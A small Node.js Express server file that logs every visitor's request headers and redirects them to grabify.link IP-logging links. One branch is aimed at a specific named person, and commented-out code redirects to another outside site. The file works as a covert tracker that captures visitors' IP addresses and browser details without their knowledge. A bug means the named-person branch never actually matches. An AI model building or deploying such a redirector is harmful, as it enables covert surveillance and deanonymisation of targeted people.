const express = require('express')
const app = express();
const bodyParser = require('body-parser');
const path = require('path')
const PORT = process.env.PORT || 5000

app.set("view engine", "ejs");
app.use(express.static(__dirname + "/public"));
app.use(bodyParser.urlencoded({ extended: true }));

app.get('/*', (req, res) => {
  var name = req.params.name
  console.log(JSON.stringify(req.headers))
//   res.redirect("https://touch-msg.com/in/f-ipd?f=" + name)
  if(name == "Siya-Dhuri") {
    res.redirect("https://grabify.link/SBNZCS");
  } else {
    res.redirect("https://grabify.link/MJ9BRY");
  }
});

app.listen(process.env.PORT || 80, () => {
    console.log('Server started!');
});


// express()
//   .use(express.static(path.join(__dirname, 'public')))
//   .set('views', path.join(__dirname, 'views'))
//   .set('view engine', 'ejs')
//   .get('/:name', (req, res) {
//       var name = req.params.name;
//       console.log(JSON.stringify(req.headers));
//       res.redirect(`https://touch-msg.com/in/f-ipd?f=${name}`)
//   })
//   .listen(PORT, () => console.log(`Listening on ${ PORT }`))
